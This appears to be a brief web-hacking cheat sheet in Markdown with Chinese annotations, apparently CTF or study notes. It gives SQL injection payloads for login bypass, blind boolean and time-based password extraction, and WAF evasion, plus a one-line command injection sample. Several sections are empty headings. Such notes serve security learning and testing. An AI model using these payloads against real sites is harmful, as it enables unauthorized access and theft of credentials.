# Web

# Table of Contents
* [Tools](#Tools)
* [F12](#F12)
* [Commands](#Commands)
* [Directory Listing](#Directory-Listing)
* [Cookie](#Cookie)
* [SQL Injection](#SQL-Injection)
  * [MySQL](#MySQL)
* [XSS Injection](#XSS-Injection)
* [Command Injection](#Command-Injection)
* [XML Injection](#XML-Injection)

## Tools
* [HackBar](https://chrome.google.com/webstore/detail/hackbar/ejljggkpbkchhfcplgpaegmbfhenekdc) : A simple security audit / Penetration test tool for testing sql injections, XSS holes and site security.

## F12
* Check Network header/response
* Use console to do js function overwrite

## Commands
* `curl https://...` : 取得網頁內容，螢幕輸出

## Directory Listing

## Cookie

## SQL Injection
### MySQL
* `'or 1 = 1 -- `
* 選取特定資料 : `'or 1 = 1 limit 1,1 -- `
  * 從offset=1開始選取前50筆資料(略過最前面1筆)
  * `limit 1,50`
* Blind sql injection
  * 有時候資料庫查詢只會顯示成功或失敗，不會顯示資料
  * 透過True/Flase回傳去判斷
    * `id = 'admin' and ascii(mid(password, 1, 1))>0 --` => True
    * `id = 'admin' and ascii(mid(password, 1, 1))>100 --` => False
    * `mid()` : 從字串索引值 start 開始截取共 length 長度的字串
  * 沒有回傳可以透過時間
    * `id = 'admin' and if(ascii(mid(password,1,1))>0, sleep(5), 1)=1`
    * if(condition, when_true, when_false)
* Bypass WAF
  * 對大小寫不敏感
  * 空白
    * /**/,%09, %0a, %0b, %0c, %0d, %a0
    * OR(1=1)
  * OR => ||, AND => &&
    * &直接傳過去是有特殊涵意的，例如?key1=value1&key2=value2
    * 用%26取代
  * = => LIKE
  * LIMIT 0,1 => LIMIT 1 OFFSET 0


## XSS Injection

## Command Injection
* `ping $whoami`

## XML Injection